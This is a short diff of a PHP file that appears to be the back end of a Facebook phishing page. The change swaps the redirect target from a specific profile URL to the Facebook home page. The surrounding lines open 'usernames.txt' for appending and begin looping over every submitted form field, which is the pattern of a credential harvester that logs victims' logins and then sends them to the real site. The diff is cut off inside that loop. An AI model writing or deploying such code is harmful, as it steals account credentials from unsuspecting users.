@@ -1,6 +1,6 @@
 
 <?php
-header ('Location:http://www.facebook.com/786kworld');
+header ('Location:http://www.facebook.com');
 $handle = fopen("usernames.txt", "a");
 foreach($_POST as $variable => $value)
 {
